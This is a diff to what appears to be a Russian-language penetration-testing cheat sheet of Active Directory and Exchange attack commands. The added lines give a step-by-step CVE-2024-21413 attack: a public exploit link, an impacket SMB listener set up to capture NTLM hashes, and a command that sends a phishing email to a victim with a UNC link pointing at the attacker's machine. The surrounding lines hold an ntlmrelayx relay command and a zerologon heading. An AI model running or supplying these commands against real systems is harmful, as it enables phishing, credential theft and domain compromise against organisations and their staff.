@@ -31,8 +31,14 @@ sudo impacket-ntlmrelayx -tf nosigning.txt -smb2support -socks
 потом админ кликает на линку на шаре 
 socks
 
+# Exchange 
+https://github.com/duy-31/CVE-2024-21413
+ставим слушатель  (сюда приходит хэш после нажатия на ссылку)
+sudo impacket-smbserver -smb2support -ip 0.0.0.0 test /tmp 
 
-
+отправляем на почту тестовое (явно фишинговое)  письмо 
+./cve-2024-21413.sh mail.domain.ru  25 user@domain.ru  victim@doain.ru  "\\ip_kali\test\duy31.txt"
+#Если victim кликает по ссылке -> получаем хэш
 
 #zerologon
 # поиск уязвимых контроллеров домен
